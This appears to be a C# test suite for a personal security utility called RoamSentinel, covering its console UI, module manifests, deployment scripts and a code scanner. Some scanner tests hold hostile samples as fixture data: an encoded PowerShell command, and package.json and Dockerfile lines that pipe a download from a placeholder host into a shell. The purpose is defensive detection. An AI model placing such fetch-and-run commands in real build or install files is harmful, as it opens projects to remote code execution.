using System.Text.RegularExpressions;
using System.Diagnostics;
using RoamSentinel.CodeGate;
using RoamSentinel.Core;
using RoamSentinel.AppActivity;
using RoamSentinel.App.Modules;
using RoamSentinel.DeviceShield;
using RoamSentinel.InsiderRisk;
using RoamSentinel.MalwareGuard;
using RoamSentinel.MobileBridge;

namespace RoamSentinel.Tests;

public sealed class ConsoleParityAndModuleTests
{
    private static readonly string RepositoryRoot = Path.GetFullPath(
        Path.Combine(
            AppContext.BaseDirectory,
            "..", "..", "..", "..", ".."));

    [Fact]
    public void Themes_DefineReadableForegroundAndBackgroundContrast()
    {
        var css = File.ReadAllText(
            Path.Combine(RepositoryRoot, "public", "styles.css"));
        var light = GetThemeColor(css, ":root", "--bg");
        var lightText = GetThemeColor(css, ":root", "--ink");
        var dark = GetThemeColor(css, "[data-theme=\"dark\"]", "--bg");
        var darkText = GetThemeColor(
            css,
            "[data-theme=\"dark\"]",
            "--ink");

        Assert.True(Contrast(light, lightText) >= 7);
        Assert.True(Contrast(dark, darkText) >= 7);
        Assert.Contains("prefers-color-scheme: dark", css);
        Assert.DoesNotContain("color: white;", css);
        Assert.Contains("--radius-lg", css);
        Assert.Contains("--topbar-bg", css);
        Assert.Contains("backdrop-filter: blur", css);
        Assert.Contains(
            "grid-template-columns: minmax(0, 1fr) minmax(292px, 330px)",
            css);
        Assert.Contains("flex-wrap: nowrap", css);
        Assert.Contains("tbody tr:hover", css);
    }

    [Fact]
    public void RsConsole_HostsTheSameDashboardRouteAsBrowserConsole()
    {
        var console = File.ReadAllText(
            Path.Combine(RepositoryRoot, "Console", "MainWindow.xaml.cs"));
        var xaml = File.ReadAllText(
            Path.Combine(RepositoryRoot, "Console", "MainWindow.xaml"));
        var dashboard = File.ReadAllText(
            Path.Combine(RepositoryRoot, "public", "index.html"));

        Assert.Contains("http://127.0.0.1:5117/?mode=desktop", console);
        Assert.Contains("WebView2", xaml);
        Assert.DoesNotContain("TabControl", xaml);
        Assert.Contains("Mode: Browser Console", dashboard);
        Assert.Contains("Device Protection Center", dashboard);
        Assert.Contains("RoamSentinel personal protection utility", dashboard);
        Assert.Contains("styles.css?v=0217", dashboard);
        Assert.Contains("aria-label=\"Module workspaces\"", dashboard);
        Assert.Contains("data-view=\"components\"", dashboard);
        Assert.Contains("data-view=\"auditLog\"", dashboard);
        Assert.Contains("data-view=\"threatIntel\"", dashboard);
        Assert.Contains("schedulerSummary", dashboard);
        Assert.Contains("Protection Scheduler", dashboard);
        var script = File.ReadAllText(
            Path.Combine(RepositoryRoot, "public", "app.js"));
        Assert.Contains("/api/v1/module-experiences", script);
        Assert.Contains("/api/v1/scheduler", script);
        Assert.Contains("applyModuleExperienceManifest", script);
        Assert.Contains("renderWorkspaceNav", script);
        Assert.Contains("schedulerStateClass", script);
    }

    [Fact]
    public void CodeGateAuditView_ExposesFilteredCsvExportsInSharedConsole()
    {
        var dashboard = File.ReadAllText(
            Path.Combine(RepositoryRoot, "public", "index.html"));
        var script = File.ReadAllText(
            Path.Combine(RepositoryRoot, "public", "app.js"));

        Assert.Contains("codeGateVerdictFilter", dashboard);
        Assert.Contains("codeGateRepositoryFilter", dashboard);
        Assert.Contains("codeGateActorFilter", dashboard);
        Assert.Contains("codeGateBundleTypeFilter", dashboard);
        Assert.Contains("exportCodeGateSubmissions", dashboard);
        Assert.Contains("exportCodeGateGitPushes", dashboard);
        Assert.Contains("exportCodeGateBundles", dashboard);
        Assert.Contains("codeGateDetailPanel", dashboard);
        Assert.Contains(
            "/api/v1/codegate/reports/submissions.csv",
            script);
        Assert.Contains(
            "/api/v1/codegate/reports/git-pushes.csv",
            script);
        Assert.Contains(
            "/api/v1/codegate/reports/offline-bundles.csv",
            script);
        Assert.Contains("renderCodeGateAuditTables", script);
        Assert.Contains("/api/v1/codegate/submissions/", script);
        Assert.Contains("/api/v1/codegate/git-pushes/", script);
        Assert.Contains("loadCodeGateSubmissionDetail", script);
        Assert.Contains("loadCodeGateGitPushDetail", script);
    }

    [Fact]
    public void MobileBridgeView_ExposesOperatorPairingWorkflow()
    {
        var dashboard = File.ReadAllText(
            Path.Combine(RepositoryRoot, "public", "index.html"));
        var script = File.ReadAllText(
            Path.Combine(RepositoryRoot, "public", "app.js"));

        Assert.Contains("Register-RoamSentinelMobileDevice.ps1", dashboard);
        Assert.Contains("mobilePairingCommand", dashboard);
        Assert.Contains("mobilePairingQr", dashboard);
        Assert.Contains("copyMobilePairingPayload", dashboard);
        Assert.Contains("No packaged phone companion is included yet", dashboard);
        Assert.Contains("/api/mobile-bridge/pairing-sessions", script);
        Assert.Contains("Register-RoamSentinelMobileDevice.ps1", script);
        Assert.Contains("-PairingCode", script);
        Assert.Contains("rs://pair", script);
        Assert.Contains("createQrSvg", script);
        Assert.Contains("createByteQrVersion4Low", script);
        Assert.Contains("copyMobilePairingPayload", script);
    }

    [Fact]
    public void ProductModules_RegisterRequiredFoundations()
    {
        IProductModule[] modules =
        [
            new DeviceShieldModule(),
            new DataEgressModule(),
            new ProtectionSchedulerModule(),
            new CodeGateModule(),
            new InsiderRiskModule(),
            new MobileBridgeModule(),
            new AppActivityModule(),
            new MalwareGuardModule()
        ];

        Assert.Equal(8, modules.Length);
        Assert.All(modules, module =>
        {
            Assert.Equal("active", module.Registration.Status);
            Assert.NotEmpty(module.Registration.Capabilities);
        });
        Assert.Contains(
            modules,
            module => module.Registration.ProductComponent == "RS Agent");
        Assert.Contains(
            modules,
            module => module.Registration.ProductComponent == "RS CodeGate");
        Assert.Contains(
            modules,
            module => module.Registration.ProductComponent == "RS Insider");
    }

    [Fact]
    public void ModuleExperienceManifest_IsolatesModuleWorkspaces()
    {
        IProductModule[] modules =
        [
            new DeviceShieldModule(),
            new DataEgressModule(),
            new ProtectionSchedulerModule(),
            new CodeGateModule(),
            new InsiderRiskModule(),
            new MobileBridgeModule(),
            new AppActivityModule(),
            new MalwareGuardModule()
        ];
        var manifest = new ModuleExperienceService(modules).GetManifest();

        Assert.Contains(
            manifest.Workspaces,
            workspace => workspace.Id == "protect" &&
                workspace.Views.Contains("overview"));
        Assert.Contains(
            manifest.Workspaces,
            workspace => workspace.Id == "codegate" &&
                workspace.Modules.Contains("rs-codegate") &&
                workspace.DefaultView == "components");
        Assert.Contains(
            manifest.Modules,
            module => module.ModuleId == "protection-scheduler" &&
                module.Workspace == "respond" &&
                module.ReadEndpoints.Contains("/api/v1/scheduler"));
        Assert.Contains(
            manifest.Modules,
            module => module.ModuleId == "mobile-bridge" &&
                module.Workspace == "devices" &&
                module.Views.Contains("mobileDevices"));
        Assert.All(manifest.Modules, module =>
        {
            Assert.NotEmpty(module.ReadEndpoints);
            Assert.NotEmpty(module.Views);
            Assert.Equal(
                "single-runtime-isolated-contract",
                module.IsolationStatus);
        });
    }

    [Fact]
    public void CodeGate_EvaluatesLocalContentWithDeterministicVerdicts()
    {
        var service = new CodeGateService();

        var blocked = service.Evaluate(new CodeGateScanRequest(
            "const apiKey = \"12345678901234567890\";",
            "test",
            "sample.js"));
        var warned = service.Evaluate(new CodeGateScanRequest(
            "powershell -EncodedCommand SQBFAFgA",
            "test",
            "deploy.ps1"));
        var allowed = service.Evaluate(new CodeGateScanRequest(
            "Console.WriteLine(\"ok\");",
            "test",
            "Program.cs"));

        Assert.Equal("block", blocked.Verdict);
        Assert.Equal("warn", warned.Verdict);
        Assert.Equal("allow", allowed.Verdict);
        Assert.Contains(
            blocked.Findings,
            finding => finding.Contains("credential"));
    }

    [Fact]
    public void CodeGate_BlocksSophosLikeStagingDeploymentRisks()
    {
        var service = new CodeGateService();
        var deployment = """
        {
          "scripts": {
            "postinstall": "curl https://example.invalid/install.sh | bash"
          },
          "dependencies": {
            "left-pad": "latest"
          }
        }
        """;
        var docker = """
        FROM node:latest
        USER root
        RUN curl https://example.invalid/bootstrap.sh | sh
        """;

        var packageResult = service.Evaluate(new CodeGateScanRequest(
            deployment,
            "staging",
            "package.json"));
        var dockerResult = service.Evaluate(new CodeGateScanRequest(
            docker,
            "staging",
            "Dockerfile"));

        Assert.Equal("block", packageResult.Verdict);
        Assert.Contains(
            packageResult.Findings,
            finding => finding.Contains("install lifecycle"));
        Assert.True(dockerResult.RiskScore >= 80);
        Assert.Equal("block", dockerResult.Verdict);
        Assert.Contains(
            dockerResult.Findings,
            finding => finding.Contains("downloaded content into a shell"));
    }

    [Fact]
    public void OfflineVmProfile_IncludesReadinessScriptHooksAndRunbook()
    {
        var readiness = File.ReadAllText(Path.Combine(
            RepositoryRoot,
            "scripts",
            "Test-OfflineVmReadiness.ps1"));
        var publishValidation = File.ReadAllText(Path.Combine(
            RepositoryRoot,
            "scripts",
            "Test-PublishOutput.ps1"));
        var runbook = File.ReadAllText(Path.Combine(
            RepositoryRoot,
            "docs",
            "OFFLINE_VM_DEPLOYMENT.md"));

        Assert.Contains("Invoke-RoamSentinelCodeGateGitHook.ps1", readiness);
        Assert.Contains("ExpectedProfile", readiness);
        Assert.Contains("CodeGateVm", readiness);
        Assert.Contains("Install-CodeGateGitHook.ps1", readiness);
        Assert.Contains("Approve-CodeGateGitHookPolicy.ps1", readiness);
        Assert.Contains("Test-CodeGateGitHookPolicy.ps1", readiness);
        Assert.Contains("Invoke-RoamSentinelEvidenceExport.ps1", readiness);
        Assert.Contains("Invoke-OfflineVmReleaseRehearsal.ps1", readiness);
        Assert.Contains("Register-RoamSentinelMobileDevice.ps1", readiness);
        Assert.Contains("Submit-RoamSentinelMobileHeartbeat.ps1", readiness);
        Assert.Contains("PairingPayload", readiness);
        Assert.Contains("Invoke-RoamSentinelStagingGate.ps1", readiness);
        Assert.Contains("scripts\\git-hooks\\pre-receive", readiness);
        Assert.Contains("scripts\\git-hooks\\post-receive", readiness);
        Assert.Contains("Install-CodeGateGitHook.ps1", publishValidation);
        Assert.Contains("install-profile.json", publishValidation);
        Assert.Contains("AgentOnly", publishValidation);
        Assert.Contains("CodeGateVm", publishValidation);
        Assert.Contains("Approve-CodeGateGitHookPolicy.ps1", publishValidation);
        Assert.Contains("Test-CodeGateGitHookPolicy.ps1", publishValidation);
        Assert.Contains("Invoke-RoamSentinelEvidenceExport.ps1", publishValidation);
        Assert.Contains("Invoke-OfflineVmReleaseRehearsal.ps1", publishValidation);
        Assert.Contains("Test-OfflineVmReadiness.ps1", publishValidation);
        Assert.Contains("Register-RoamSentinelMobileDevice.ps1", publishValidation);
        Assert.Contains("Submit-RoamSentinelMobileHeartbeat.ps1", publishValidation);
        Assert.Contains("Invoke-RoamSentinelStagingGate.ps1", publishValidation);
        Assert.Contains("loopback", runbook, StringComparison.OrdinalIgnoreCase);
        Assert.Contains("OFFLINE_VM_RELEASE_CHECKLIST.md", runbook);
        Assert.Contains("Invoke-OfflineVmReleaseRehearsal.ps1", runbook);
        Assert.Contains("--import-codegate-bundle", runbook);
        Assert.Contains("--codegate-scan", runbook);
        Assert.Contains("Install-CodeGateGitHook.ps1", runbook);
        Assert.Contains("-Profile CodeGateVm", runbook);
        Assert.Contains("Approve-CodeGateGitHookPolicy.ps1", runbook);
        Assert.Contains("Test-CodeGateGitHookPolicy.ps1", runbook);
        Assert.Contains("Invoke-RoamSentinelEvidenceExport.ps1", runbook);
        Assert.Contains("roamsentinel-codegate.policy.json", runbook);
        Assert.True(File.Exists(Path.Combine(
            RepositoryRoot,
            "docs",
            "OFFLINE_VM_RELEASE_CHECKLIST.md")));
    }

    [Fact]
    public void PublishValidation_EnforcesAgentOnlyAndCodeGateVmProfiles()
    {
        var root = Path.Combine(
            Path.GetTempPath(),
            "RoamSentinel.PublishProfile.Tests",
            Guid.NewGuid().ToString("N"));
        try
        {
            var agentOnly = Path.Combine(root, "agent");
            var codeGateVm = Path.Combine(root, "codegate-vm");
            CreatePublishFixture(agentOnly, "AgentOnly", includeConsole: false);
            CreatePublishFixture(codeGateVm, "CodeGateVm", includeConsole: true);

            var agentCheck = RunPowerShell(
                Path.Combine(RepositoryRoot, "scripts", "Test-PublishOutput.ps1"),
                $"-PublishDirectory \"{agentOnly}\" -Profile AgentOnly");
            var vmCheck = RunPowerShell(
                Path.Combine(RepositoryRoot, "scripts", "Test-PublishOutput.ps1"),
                $"-PublishDirectory \"{codeGateVm}\" -Profile CodeGateVm");

            Assert.Equal(0, agentCheck.ExitCode);
            Assert.Equal(0, vmCheck.ExitCode);
            Assert.DoesNotContain("Console\\RoamSentinel.Console.exe", agentCheck.Output);
        }
        finally
        {
            if (Directory.Exists(root))
            {
                Directory.Delete(root, recursive: true);
            }
        }
    }

    [Fact]
    public void EvidenceExportScript_CreatesManifestAndAppliesRetention()
    {
        var root = Path.Combine(
            Path.GetTempPath(),
            "RoamSentinel.EvidenceExport.Tests",
            Guid.NewGuid().ToString("N"));
        var output = Path.Combine(root, "evidence");
        var old = Path.Combine(output, "RoamSentinel-evidence-20000101-000000");
        var fakeExe = Path.Combine(root, "fake-roamsentinel.cmd");
        Directory.CreateDirectory(old);
        File.WriteAllText(Path.Combine(old, "old.txt"), "old");
        Directory.SetLastWriteTimeUtc(old, DateTime.UtcNow.AddDays(-5));
        Directory.CreateDirectory(root);
        File.WriteAllText(
            fakeExe,
            """
            @echo off
            if "%1"=="--export-backup" (
              if not exist "%2" mkdir "%2"
              echo backup > "%2\RoamSentinel-backup-test.zip"
              echo Backup exported: %2\RoamSentinel-backup-test.zip
              exit /b 0
            )
            if "%1"=="--scheduler-status" (
              echo {"enabled":true,"health":"healthy","tasks":[]} > "%4"
              echo Scheduler status exported: %4
              exit /b 0
            )
            exit /b 1
            """);

        try
        {
            var result = RunPowerShell(
                Path.Combine(RepositoryRoot, "scripts", "Invoke-RoamSentinelEvidenceExport.ps1"),
                $"-RoamSentinelExe \"{fakeExe}\" -OutputDirectory \"{output}\" -RetentionDays 1");
            var run = Assert.Single(Directory.GetDirectories(output));
            var manifest = File.ReadAllText(
                Path.Combine(run, "evidence-manifest.json"));

            Assert.Equal(0, result.ExitCode);
            Assert.Contains("RoamSentinel evidence export created", result.Output);
            Assert.Contains("\"product\"", manifest);
            Assert.Contains("RoamSentinel-backup-test.zip", manifest);
            Assert.Contains("scheduler-status.json", manifest);
            Assert.True(File.Exists(Path.Combine(run, "scheduler-status.json")));
            Assert.False(Directory.Exists(old));
        }
        finally
        {
            if (Directory.Exists(root))
            {
                Directory.Delete(root, recursive: true);
            }
        }
    }

    [Fact]
    public void CodeGateGitHookPolicyReviewScript_ValidatesInstalledPolicy()
    {
        var root = Path.Combine(
            Path.GetTempPath(),
            "RoamSentinel.HookPolicy.Tests",
            Guid.NewGuid().ToString("N"));
        var repository = Path.Combine(root, "example.git");
        var installRoot = Path.Combine(root, "install");
        var installScripts = Path.Combine(installRoot, "scripts");
        Directory.CreateDirectory(Path.Combine(repository, "hooks"));
        Directory.CreateDirectory(installScripts);
        File.Copy(
            Path.Combine(
                RepositoryRoot,
                "scripts",
                "Invoke-RoamSentinelCodeGateGitHook.ps1"),
            Path.Combine(installScripts, "Invoke-RoamSentinelCodeGateGitHook.ps1"));

        try
        {
            var installer = RunPowerShell(
                Path.Combine(RepositoryRoot, "scripts", "Install-CodeGateGitHook.ps1"),
                $"-Repository \"{repository}\" -InstallDirectory \"{installRoot}\" -RoamSentinelExe \"{Path.Combine(installRoot, "RoamSentinel.exe")}\" -Mode pre-receive -Force");
            var review = RunPowerShell(
                Path.Combine(RepositoryRoot, "scripts", "Test-CodeGateGitHookPolicy.ps1"),
                $"-Repository \"{repository}\" -ExpectedMode pre-receive -Json");
            var unapprovedReview = RunPowerShell(
                Path.Combine(RepositoryRoot, "scripts", "Test-CodeGateGitHookPolicy.ps1"),
                $"-Repository \"{repository}\" -ExpectedMode pre-receive -RequireApproval -Json");
            var approval = RunPowerShell(
                Path.Combine(RepositoryRoot, "scripts", "Approve-CodeGateGitHookPolicy.ps1"),
                $"-Repository \"{repository}\" -ApprovedBy \"security-admin\" -Reason \"VM pilot policy review\" -Ticket \"RS-VM-1\" -Json");
            var approvedReview = RunPowerShell(
                Path.Combine(RepositoryRoot, "scripts", "Test-CodeGateGitHookPolicy.ps1"),
                $"-Repository \"{repository}\" -ExpectedMode pre-receive -RequireApproval -Json");

            Assert.Equal(0, installer.ExitCode);
            Assert.Equal(0, review.ExitCode);
            Assert.Contains("roamsentinel-codegate.policy.json", review.Output);
            Assert.Matches("\"ok\"\\s*:\\s*true", review.Output);
            Assert.NotEqual(0, unapprovedReview.ExitCode);
            Assert.Contains("approval_missing", unapprovedReview.Output);
            Assert.Equal(0, approval.ExitCode);
            Assert.Contains("security-admin", approval.Output);
            Assert.Equal(0, approvedReview.ExitCode);
            Assert.Contains("VM pilot policy review", approvedReview.Output);
            Assert.Matches("\"approvalHistoryCount\"\\s*:\\s*1", approvedReview.Output);
        }
        finally
        {
            if (Directory.Exists(root))
            {
                Directory.Delete(root, recursive: true);
            }
        }
    }

    private static string GetThemeColor(
        string css,
        string selector,
        string variable)
    {
        var block = Regex.Match(
            css,
            $@"{Regex.Escape(selector)}\s*\{{(?<body>.*?)\}}",
            RegexOptions.Singleline).Groups["body"].Value;
        return Regex.Match(
            block,
            $@"{Regex.Escape(variable)}:\s*(#[0-9a-fA-F]{{6}})")
            .Groups[1].Value;
    }

    private static double Contrast(string first, string second)
    {
        var high = Math.Max(Luminance(first), Luminance(second));
        var low = Math.Min(Luminance(first), Luminance(second));
        return (high + 0.05) / (low + 0.05);
    }

    private static double Luminance(string hex)
    {
        var values = Enumerable.Range(0, 3)
            .Select(index => Convert.ToInt32(
                hex.Substring(1 + index * 2, 2),
                16) / 255d)
            .Select(value => value <= 0.04045
                ? value / 12.92
                : Math.Pow((value + 0.055) / 1.055, 2.4))
            .ToArray();
        return 0.2126 * values[0] +
               0.7152 * values[1] +
               0.0722 * values[2];
    }

    private static (int ExitCode, string Output) RunPowerShell(
        string script,
        string arguments)
    {
        var start = new ProcessStartInfo(
            "powershell",
            $"-NoProfile -ExecutionPolicy Bypass -File \"{script}\" {arguments}")
        {
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            UseShellExecute = false,
            CreateNoWindow = true
        };
        using var process = Process.Start(start)!;
        var output = process.StandardOutput.ReadToEnd();
        output += process.StandardError.ReadToEnd();
        process.WaitForExit();
        return (process.ExitCode, output);
    }

    private static void CreatePublishFixture(
        string root,
        string profile,
        bool includeConsole)
    {
        var files = new[]
        {
            "RoamSentinel.exe",
            "RoamSentinel.dll",
            "appsettings.json",
            "public\\index.html",
            "public\\app.js",
            "public\\styles.css",
            "scripts\\Invoke-RoamSentinelCodeGateGitHook.ps1",
            "scripts\\Install-CodeGateGitHook.ps1",
            "scripts\\Approve-CodeGateGitHookPolicy.ps1",
            "scripts\\Test-CodeGateGitHookPolicy.ps1",
            "scripts\\Invoke-RoamSentinelEvidenceExport.ps1",
            "scripts\\Invoke-OfflineVmReleaseRehearsal.ps1",
            "scripts\\Test-OfflineVmReadiness.ps1",
            "scripts\\Register-RoamSentinelMobileDevice.ps1",
            "scripts\\Submit-RoamSentinelMobileHeartbeat.ps1",
            "scripts\\Invoke-RoamSentinelStagingGate.ps1",
            "scripts\\git-hooks\\pre-receive",
            "scripts\\git-hooks\\post-receive"
        };
        foreach (var file in files)
        {
            var path = Path.Combine(root, file);
            Directory.CreateDirectory(Path.GetDirectoryName(path)!);
            File.WriteAllText(path, "placeholder");
        }
        if (includeConsole)
        {
            var console = Path.Combine(root, "Console", "RoamSentinel.Console.exe");
            Directory.CreateDirectory(Path.GetDirectoryName(console)!);
            File.WriteAllText(console, "placeholder");
        }

        File.WriteAllText(
            Path.Combine(root, "install-profile.json"),
            $$"""
            {
              "schemaVersion": "1.0",
              "product": "RoamSentinel",
              "profile": "{{profile}}",
              "runtime": "win-x64",
              "frameworkDependent": false,
              "includesConsole": {{includeConsole.ToString().ToLowerInvariant()}},
              "includesCodeGateVmTools": {{(profile == "CodeGateVm").ToString().ToLowerInvariant()}},
              "createdAt": "2026-07-21T00:00:00Z"
            }
            """);
    }
}
